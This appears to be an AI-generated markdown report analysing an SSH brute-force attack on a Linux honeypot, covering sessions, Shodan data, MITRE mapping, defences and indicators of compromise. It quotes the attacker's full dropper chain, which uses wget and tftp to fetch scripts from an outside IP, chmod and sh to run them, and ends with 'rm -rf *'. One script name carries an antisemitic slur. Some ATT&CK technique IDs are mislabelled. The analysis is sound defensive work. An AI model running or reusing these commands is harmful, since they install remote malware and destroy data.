> `Your role is to answer questions about an attack on a Linux honeypot. You will analyze the commands executed, uploaded/downloaded files, HTTP requests, sessionsand other data logged during the attack to understand the methods and goals of the attacker.You will also analyze OSINT data gathered about the attacking IP(s) including: geolocation, open ports, running services, threatfeed reports and reports of known malware associated with the IP(s) to get additional context on the attack and enhance your analysis. Your answers will be used in a GitHub .md file so you should use markdown syntax to format your output. Use the available functions to request relevant information to thoroughly answer each question. You should use multiple function calls to analyze the data returned by previous function calls and to get any additional data you need to answer each question as accurately as possible. For example if you see that the attacker downloaded malware in one of the commands executed, you should use the get_attack_attrs function with the arguement 'uniq_malware' to get a list of unique malware_ids associated with the attack, then use get_malware_attrs to analyze the malware, and the query_ functions to get additional OSINT data about the malware and its source. IMPORTANT: When using get_attack_attrs use the uniq_<attr> modifier first and only get all values if necessary after analyzing the unique values. For context that the honeypot system has the following open ports:  Its internal IP address is: 172.31.5.68 and its external IP address is: 54.67.87.80. Use the code_interpreter tool to enhance your analysis. For example if you find an encoded string in the http_requests, commands, or malware, you should use the code_interpreter tool to decode it, then analyze the decoded result in context when answering questions.`

<h3>Answer</h3>
</summary>

The attack involved numerous SSH sessions from the attacker's IP `138.197.148.152` to the honeypot IP `172.31.5.68:2222`. Here is a summary of these sessions:

- **Total Sessions:** Multiple sessions with varying durations from a few hundred milliseconds to nearly one second.
- **Connection Durations:** Ranged from as brief as 0.04 seconds to as long as 0.98 seconds.
- **Credentials Used:** Some sessions show successful logins using the username `root` and password `12345678`.
- **Commands Executed:** In several sessions where the login was successful, at least one command was executed.
- **Malware:** In sessions where logins were successful, malware downloads have been noted.
- **Attack Characteristics:**
  - The sessions included multiple source ports indicating a possible scanning or brute force attempt.
  - Quick successive connections suggest automated SSH login attempts.
  - The similarity in connection durations suggests that a script or botnet is likely responsible for the attack.

An excerpt of session details:

1. **Session 8599dd602207**
   - Login: `root:12345678`
   - Commands: 1
   - Malware: 1
   - Duration: 0.08 seconds

2. **Session 0a7536c99648**
   - Login: `root:12345678`
   - Commands: 1
   - Malware: 1
   - Duration: 0.11 seconds

(Note: The specific `Session` identifiers were truncated due to the large output. For comprehensive analysis, we would potentially loop through all sessions to get each's attributes and actions.)

<h3>Answer</h3>

The analysis of one of the SSH sessions involved in the attack reveals the following:

- **Username:** `root`
- **Password:** `12345678`
- **SSH Hassh:** `92674389fa1e47a27ddd8d9b63ecd42b`
- **Start Time:** `2024-01-10 02:02:06`
- **End Time:** `2024-01-10 02:03:08`
- **Commands Executed:** 
  - The attacker navigated to various directories (`/tmp`, `/var/run`, `/mnt`, `/root`, `/`)
  - Downloaded a script from `http://213.255.246.81/fuckjewishpeople.sh`
  - Changed permissions of the downloaded script to executable (`chmod 777`)
  - Executed the script (`sh fuckjewishpeople.sh`)
  - Downloaded additional scripts using `tftp` from the same IP
  - Executed the additional downloaded scripts (`tftp1.sh`, `tftp2.sh`)
  - Removed all files in the current directory (`rm -rf *`)

The session shows a successful brute force attempt using default or commonly used credentials. Following that, a sequence of commands to download and execute scripts suggesting malicious intent, likely for further propagation of the attack, exploitation, or maintaining access through downloaded scripts. The action of removing files could be an attempt to clean up any trace of the attack or could be a result of a destructive payload within the downloaded scripts. 

The name of the script downloaded ("fuckjewishpeople.sh") is offensive and suggests a potentially politically or ideologically motivated attack, but without further analysis of the script itself, this remains conjecture.

Based on this single session analysis, it appears that the SSH hassh is common across all the sessions, indicating a uniform method or tool used for initiating SSH sessions by the attacker. It also shows that the attacker has automated the process of exploiting successful login sessions to download and run malicious scripts.

Given the commands executed, additional investigation into the downloaded scripts' URLs would be necessary to fully understand their functionality and the scope of the attack.

## Prompt: Summarize what is known about the IP addresses involved in the attack using Shodan data.

**Run ID:** `run_Z1hnfYwMoQVkU75lM5by5hii`

<details>
<summary>
<h3>Answer</h3>
</summary>

Using Shodan, the following information has been gathered about the IP address `138.197.148.152` involved in the attack:

- **Cloud Provider**: DigitalOcean
- **Cloud Region**: Canada, Ontario (ca-on)
- **Country**: Canada
- **City**: Toronto
- **Organization**: DigitalOcean, LLC
- **ISP**: DigitalOcean, LLC
- **Autonomous System Number (ASN)**: AS14061

Regarding the open ports and services:
- **Port 22**: Running OpenSSH 7.6p1 Ubuntu-4ubuntu0.5, which is standard for remote administration (typically SSH service).
- **Port 80**: The service on this port issued a 301 Moved Permanently response when probed, which indicates that HTTP traffic is being redirected to HTTPS (port 443).
- **Port 443**: Responded with a 400 Bad Request error during HTTP probing, indicating that the service might require specific host headers or other information to establish a proper connection, or it may not serve regular web traffic.

The Shodan data primarily describes the cloud infrastructure used by the IP address and indicates that standard web services are running on the commonly used ports for web traffic (80 and 443). The precise nature of the services running on these ports requires additional analysis since only basic response headers are captured here. The presence of an active SSH service is consistent with the attack vector, which was conducted over SSH on port 2222.

## Prompt: Explain the commands used and their functions in the context of the attack.

**Run ID:** `run_3m6k3h88duceTTVyxX14ZAJL`

<details>
<summary>
<h3>Answer</h3>
</summary>

The commands used in the attack can be broken down into a series of steps that are commonly associated with post-exploitation activities in a compromised system. Here's the breakdown of the commands and their functions:

```bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
```
- Tries to change the directory to one of the listed directories, where `/tmp` and `/var/run` are commonly writable by all users, `/mnt` is for mount points, and `/root` is the home directory for the root user. If all directories fail, it defaults to the root directory `/`. 

```bash
wget http://213.255.246.81/fuckjewishpeople.sh;
```
- Downloads a file named `fuckjewishpeople.sh` from the specified IP address. `wget` is a network downloader that retrieves files from web servers.

```bash
chmod 777 fuckjewishpeople.sh;
```
- Changes the file permissions of `fuckjewishpeople.sh` to be fully writable, readable, and executable by any user on the system (`777` is the mode that allows all actions for all users).

```bash
sh fuckjewishpeople.sh;
```
- Executes the shell script `fuckjewishpeople.sh`, which may contain any manner of malicious commands such as further malware download, configuration changes, or setting up a backdoor.

```bash
tftp 213.255.246.81 -c get tftp1.sh;
```
- Uses the Trivial File Transfer Protocol (TFTP) to download a file named `tftp1.sh` from the specified IP address. TFTP is a simple file transfer protocol often used when FTP is not available.

```bash
chmod 777 tftp1.sh; sh tftp1.sh;
```
- Similar to the previous `chmod` and `sh` commands, this sets the permissions of the new script (`tftp1.sh`) and executes it.

```bash
tftp -r tftp2.sh -g 213.255.246.81;
```
- Another TFTP command that retrieves a file named `tftp2.sh` from the same IP address. This time the syntax specifies the remote file and gets the action explicitly.

```bash
chmod 777 tftp2.sh; sh tftp2.sh;
```
- Again changes permissions to be fully accessible and executes the `tftp2.sh` script.

```bash
rm -rf *;
```
- Deletes all files in the current working directory. The `-r` option is recursive (delete directories and their contents), and `-f` is "force" (ignore nonexistent files and never prompt). This could be used to cover tracks, delete important files, cause disruption, or it could be the destructive payload of one of the scripts.

### Context of the Attack
These commands, taken together, show a clear intent to manipulate a compromised system in several harmful ways:

1. Persistence - Downloading and executing scripts could create backdoors, install rootkits, or set up other methods to retain access.
2. Lateral movement - Scripts may attempt to spread laterally to other systems in the network or connect to command and control (C&C) servers for further instructions.
3. Destructiveness - The final command suggests a willingness to destroy data, possibly indicating a ransomware-like element, a punitive action, or a smokescreen to hide other activities.

The use of multiple fallback directories and multiple methods of downloading files (wget and tftp) demonstrates redundancy in the attack plan, ensuring that if one step fails, the next could succeed. It is important to note that the specific effects of the scripts can only be fully understood by analyzing the contents of these scripts.

## Prompt: Explain the how the malware functions in the context of the attack.

**Run ID:** `run_zuXawF6Vm9pA5ajzFM3KuYUd`

<details>
<summary>
<h3>Answer</h3>
</summary>

The malware, in the context of the attack, functions as a means for the attacker to execute a series of unauthorized commands or to deploy additional malicious payloads onto the compromised system. Although the exact content and functionality of the downloaded shell script `fuckjewishpeople.sh` are not explicitly known from the information provided, we can infer its potential roles based on the commands used:

1. **Download and Execution**: The malware is initially downloaded using `wget` from a remote server, which indicates that the attacker has control over the source IP or its content. Once on the compromised machine, the shell script is given executable permissions (`chmod 777`) and is executed (`sh` command).

2. **Payload Delivery**: The role of the malware may be to act as an initial payload that prepares the system for the delivery of additional malware. For example, it could disable security measures, create a backdoor by adding unauthorized SSH keys or user accounts, or modify system configurations to set up persistence.

3. **Further Downloads**: The commands following the execution of the initial script suggest that `fuckjewishpeople.sh` might also contain instructions to download further scripts (`tftp1.sh` and `tftp2.sh`) using `tftp`, which indicates an orchestrated multi-stage attack.

4. **Execution of Secondary Payloads**: Similar to the initial download, the subsequent scripts are given full permissions and executed, which implies a likelihood of different stages or components of the malware being deployed - each possibly with its own attack vector or purpose, such as a rootkit, a ransomware payload, botnet code, or espionage-related tools.

5. **Covering Tracks or Destructive Actions**: The command to remove all files (`rm -rf *`) could serve the dual purpose of removing evidence of the attack, hindering forensic analysis, or destructing data as part of the malicious intent (e.g., sabotage or impact maximization).

In summary, the malware operates as an initial gatecrasher that opens the door for subsequent actions and potentially more sophisticated attack modules. The script’s purpose could range from establishing a foothold for prolonged access to executing a complete attack sequence ending in the destruction of files to conceal the attack activities or intentionally cause harm.

Without the actual script content, further speculation on its detailed functions would not be accurate. It's critical to analyze the script through reverse engineering to understand its definitive behavior, capabilities, and intent within the attack.

## Prompt: Explain which vulnerabilities are being exploited. Include the exploit name(s), CVE number(s) and example code from ExploitDB, if possible.

**Run ID:** `run_LR9NAgQvi057hTFXn76gctfZ`

<details>
<summary>
<h3>Answer</h3>
</summary>

Based on the information provided, the primary vulnerability being exploited appears to be weak or default credentials used on an SSH service (Port 22). The attacker uses the username `root` and password `12345678`, indicating a brute-force attack or exploiting a common weak/default credential.

However, this specific vulnerability does not have a particular CVE number or an exploit name because it's essentially a poor security practice by the server administrator rather than a flaw or bug in the software. Therefore, no ExploitDB code is available for such cases.

A secure configuration such as requiring cryptographic keys for login, setting up two-factor authentication (2FA), or implementing defence-in-depth strategies, such as deploying intrusion detection or prevention systems, rate limiting, and continuously monitoring suspicious activity, are practical ways to harden servers against such common types of attacks.

## Prompt: How can this attack be classified using the MITRE ATT&CK framework?

**Run ID:** `run_Tfq5EQxJVasWdinO1nYLHodh`

<details>
<summary>
<h3>Answer</h3>
</summary>

Based on the provided information about the attack, several techniques from the MITRE ATT&CK framework can be identified:

1. **T1078 - Valid Accounts**: The attacker exploited weak or default SSH credentials (`root`/`12345678`). In this case, the 'valid' account is the root user, which provides the highest privileges on a system.

2. **T1047 - Network Service Scanning**: The attacker must presumably have identified the SSH service (typically running on port 22 or, in this case, possibly an atypical port 2222) as a potential vulnerability for their initial access, indicating some level of service scanning beforehand.

3. **T1110 - Brute Force**: The attacker used brute force to attempt to log in via SSH. The successful use of relatively simple and frequently used credentials suggests a brute-force attack.

4. **T1021 - Remote Services**: The attacker leveraged SSH to carry out the attack, which is a commonly used remote service for managing Unix-based systems.

5. **T1072 - Software Deployment Tools**: After gaining access to the system, the attacker used `wget` and `tftp` - tools typically used for downloading files or software - to download the malicious shell script and subsequently get it executed on the system.

6. **T1059 - Command and Scripting Interpreter**: The attacker executed common Unix/bash scripting commands to carry out their malicious activity, showing the use of scripting in this attack.

7. **T1105 - Ingress Tool Transfer** : The malware `fuckjewishpeople.sh` was transferred into the machine using `wget` from an external server.

8. **T1064 - Scripting**: The attacker downloaded malicious bash scripts and executed them potentially spreading the attack, increasing access, or performing destructive actions.

9. **T1486 - Data Destruction**: The execution of the `rm -rf *` command suggests an intent to remove or destroy data, either to cover tracks or cause harm.

These techniques collectively show that the attacker was able to exploit weak security practices (namely, weak credentials) to gain initial access to the system, then leveraged scripting and built-in tools to download and execute malicious scripts, potentially carrying out destructive actions or propagating the attack.

## Prompt: What is the goal of the attack?

**Run ID:** `run_ubQdfyfOEKF0U2adLwzBY5OA`

<details>
<summary>
<h3>Answer</h3>
</summary>

Based on the analysis of the attack, the attacker's goals could include the following:

- **System Compromise and Control**: The attacker gained unauthorized access to the system using brute-force methods on open SSH services, which indicates a clear goal of initially breaching and taking control of the system. 

- **Malware Execution and Propagation**: By executing malicious scripts, the attacker likely aimed to deploy further malware payloads that could serve various purposes, such as creating backdoors for persistent access, altering system configurations, or spreading the malware to other connected systems.

- **Data Destruction/Damage**: With the execution of the `rm -rf *` command, there appears to be an intentional effort to delete all files in the given directory. This could be either a form of sabotage or an attempt to wipe out system logs and other evidence of their activities.

- **Botnet Activity**: Considering the wide engagement with numerous vulnerabilities across various systems by the attacker's IP address, as shown in the threat intelligence reports, the attacker could be aiming to build or contribute to a botnet. The infected systems could then be used for distributed denial-of-service attacks (DDoS), crypto mining, or other coordinated attacks.

However, without fully analyzing the content and functionality of the downloaded scripts (`fuckjewishpeople.sh`, `tftp1.sh`, `tftp2.sh`), we cannot definitively determine all the potential goals of the attacker. The scripts could uncover more specific intentions if reverse-engineered and analyzed.

## Prompt: If the system is vulnerable, would the attack will be successful?

**Run ID:** `run_QsKvJeND1DhJ5AIv2OcM1Wdk`

<details>
<summary>
<h3>Answer</h3>
</summary>

Given the attacker's strategies and the vulnerabilities exploited in this attack, there is a high likelihood that the attack would be successful if the system is vulnerable. However, the success of the attack entirely hinges on two main factors:

1. **Weak or Default SSH Credentials**: The attacker managed to gain initial access by exploiting weak credentials – username `root` and password `12345678`. If the system's SSH service allows root login or requires weak credentials, the attacker would have successfully breached the system. 

2. **Execution of Downloaded Scripts**: After gaining access, the attacker downloads and executes potentially malicious scripts. If the system does not have controls in place to prevent the execution of unauthorized scripts, the attacker would be able to proceed with their post-exploitation activities, including further system compromise and possible data destruction.

So, the attack's success largely depends on the system's security configuration that allows for these vulnerabilities. Nevertheless, these kinds of attacks can be mitigated by good security practices:
- By securing SSH services with strong and unique user credentials, prohibiting root logins, or implementing keys-based authentication.
- By enforcing robust script and application controls.
- By deploying intrusion detection/prevention systems (IDS/IPS) and securing servers with firewalls.
- By implementing continuous monitoring, diagnostics, and logging.
- By performing regular security audits and patching the system as required. 

In the case that the attack is successful, a compromised system's indicators, such as unusual system performance, the execution of unusual commands, or unexpected data loss, should trigger further security investigation and responses.

## Prompt: How can a system be protected from this attack?

**Run ID:** `run_xPwtTgAedvqgrUmUEddXXj7q`

<details>
<summary>
<h3>Answer</h3>
</summary>

Here are several measures that should be taken to protect a server from this kind of attack:

1. **Strong Authentication Measures**: Require strong, unique passwords or consider key-based SSH authentication. Limit the number of unsuccessful login attempts that an IP can make, thus thwarting brute force attacks. If possible, disallow root login and ensure the principle of least privilege is followed.

2. **Use Multi-Factor Authentication (MFA)**: Implementing multi-factor authentication can significantly improve security by requiring users to provide multiple forms of identity verification.

3. **Regular Updates**: Always keep your server's operating system and applications up to date. Regularly update your services, applications, and kernels to patch vulnerabilities.

4. **Security Groups and Firewalls**: Configure your firewall rules to allow SSH connections only from trusted IP addresses. This greatly reduces the exposed surface area to potential attackers.

5. **Intrusion Detection/Prevention**: Tools like Fail2ban, DenyHosts, or Cloudflare's IP firewalls can limit or block repeated failed login attempts, thus protecting against brute-force attacks.

6. **Secure Configuration**: Hardening your server and ensuring proper configuration is key in reducing your server's attack surface. Remove or disable unnecessary services and applications.

7. **Monitor System Logs**: Regularly monitor SSH server logs (`/var/log/secure` or `/var/log/auth.log`). Unusual login patterns or failed access attempts can be a sign of an attempted attack.

8. **Active Threat Intelligence and Updates**: Incorporate threat feeds and IoC databases into your security infrastructure to keep track of new vulnerabilities, threats, and rogue IPs.

9. **Train Your Staff**: Ensure everyone involved with managing the server knows and applies best practices. Security is weakest where users are not aware.

10. **Backup Regularly and Keep Offline Copies**: Regular backups and offline storage can make data recovery much easier in the case of data loss.

By applying these measures, you can significantly thwart and mitigate the risks of attacks like these.

## Prompt: What are the indicators of compromise (IOCs) for this attack?

**Run ID:** `run_1Z9kEF9u0wBS8sxp5OGzrSPp`

<details>
<summary>
<h3>Answer</h3>
</summary>

The indicators of compromise (IOCs) for this attack include:

1. **Source IP of the Attacker**: `138.197.148.152` - This IP address was found to be the source of the malicious SSH login attempts. System logs showing repeated login attempts or traffic from this IP would be a clear sign of potential attack activities.

2. **Brute-force Attempts**: Multiple login attempts using the username `root` and the password `12345678` may indicate brute-force attempts.

3. **Successful Logins**: Successful login messages for the root user, especially from unfamiliar IPs, should be considered suspicious.

4. **Execution of Certain Commands**: The execution of commands related to downloading and the running of malicious scripts are significant IOCs. These activities are red flags for post-exploitation activities:
    - `wget http://213.255.246.81/fuckjewishpeople.sh`
    - `chmod 777 fuckjewishpeople.sh`

**Summary of the Attack Details, Methods, and Goals**

According to the available data, the attacker used the IP address `138.197.148.152`, which is associated with DigitalOcean LLC. This IP was the source of malicious SSH login attempts targeted at our system. The geographical location of the IP is in Toronto, Ontario, Canada. 

*Methods Employed:*

1. **Initial Access**: The attacker exploited weak SSH credentials to gain access to the system. The username used was `root`, and the password was `12345678`. This indicates either a brute-force attack or the exploitation of common/default credentials.

2. **Execution of Commands**: The attacker executed a sequence of terminal commands aimed at downloading and running malicious shell scripts (`fuckjewishpeople.sh`, `tftp1.sh` and `tftp2.sh`). These commands were used to modify access permissions and initiate the execution of the scripts. Ultimately, a command to delete all files in the working directory was also issued (`rm -rf *`).

3. **Malware Deployment**: The attacker utilized a shell script (`fuckjewishpeople.sh`) downloaded from a server `213.255.246.81` using the `wget` utility. The command sequences indicate a possible multi-stage malware attack, involving multiple scripts fetched from the same server with the `tftp` utility. 

*Goals of the Attack:*

Based on the analysis of the attack, the likely goals include:

1. **System Compromise and Control**: The attacker aimed to gain initial access to the system using brute-force methods on the SSH service. The primary goal was to breach and maintain control over the targeted system.

2. **Malware Execution and Propagation**: The downloaded shell scripts suggest a deliberate propagation of malware to compromise the system further, possibly to exploit its resources or for lateral movement within a network.

3. **Data Destruction/Damage**: The execution of the `rm -rf *` command suggests a possible intent to delete files. This could either be a form of sabotage, an attempt to clean up or a smokescreen to hide the main intent of the attack.

The exact nature of each script's payload and the breadth of the attacker's objectives could only be fully understood by analyzing the shell scripts' contents.
